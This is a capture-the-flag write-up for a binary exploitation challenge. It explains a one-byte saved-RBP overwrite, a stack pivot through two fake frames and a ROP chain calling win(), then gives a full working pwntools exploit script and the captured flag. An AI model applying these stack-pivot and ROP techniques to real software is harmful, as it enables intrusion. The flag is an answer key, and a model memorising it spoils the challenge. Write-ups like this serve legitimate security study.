---
title: "MaintenanceLog"
ctf: "CSSCTF"
date: 2026-09-30
category: pwn
flag_format: "CSSCTF{...}"
---

The binary has NX and a canary, but no PIE. It leaks the report-buffer address and reads 0x50 bytes into that buffer without checking a canary. A nested `tag` function then reads 0x21 bytes into a 0x20-byte buffer, letting us change the low byte of the report frame's saved RBP.

I used that one-byte overwrite to pivot through two fake frames: Frame A is placed at an address reachable by changing only the RBP low byte, and its `leave; ret` pivots to Frame B at the buffer start. Frame B contains a ROP chain calling `win(0xdeadbeef, 0xcafebabe)`. The relevant gadgets are `pop rdi; ret` at `0x40124d`, `pop rsi; ret` at `0x40124f`, `ret` at `0x401016`, and `leave; ret` at `0x401417`; `win` is at `0x401268`.

The script below builds both frames around the leaked stack address and accounts for stack alignment:

```python
from pwn import *

HOST, PORT = "34.116.80.78", 7312
POP_RDI, POP_RSI, RET = 0x40124d, 0x40124f, 0x401016
LEAVE_RET, WIN = 0x401417, 0x401268

def build_payload(leaked):
    report_rbp = leaked + 0x50
    base = report_rbp & ~0xff
    frame_a = None
    use_align = False
    frame_b_off = 0

    for lsb in range(256):
        cand = base | lsb
        off_a = cand - leaked
        if not 0 <= off_a <= 0x50 - 16:
            continue
        if (leaked + 48) % 16 == 0 and off_a >= 48:
            frame_a = cand
            break
        if (leaked + 56) % 16 == 0 and off_a >= 56:
            frame_a, use_align = cand, True
            break
    if frame_a is None:
        raise RuntimeError("no pivot")

    buf = bytearray(0x50)
    chain = (p64(RET) if use_align else b"")
    chain += p64(POP_RDI) + p64(0xdeadbeef)
    chain += p64(POP_RSI) + p64(0xcafebabe) + p64(WIN)
    buf[frame_b_off:frame_b_off + 8] = p64(0)
    buf[frame_b_off + 8:frame_b_off + 8 + len(chain)] = chain

    off_a = frame_a - leaked
    buf[off_a:off_a + 8] = p64(leaked + frame_b_off)
    buf[off_a + 8:off_a + 16] = p64(LEAVE_RET)
    tag = b"B" * 0x20 + bytes([frame_a & 0xff])
    return bytes(buf), tag

io = remote(HOST, PORT)
io.recvuntil(b"allocated at: ")
leaked = int(io.recvline().strip(), 16)
io.recvuntil(b"Enter report summary: ")
report, tag = build_payload(leaked)
io.send(report)
io.recvuntil(b"Tagging operator: ")
io.send(tag)
print(io.recvall(timeout=3).decode())
```

Flag:

```text
CSSCTF{Duh_m4t3_1_4m_sl33py}
```
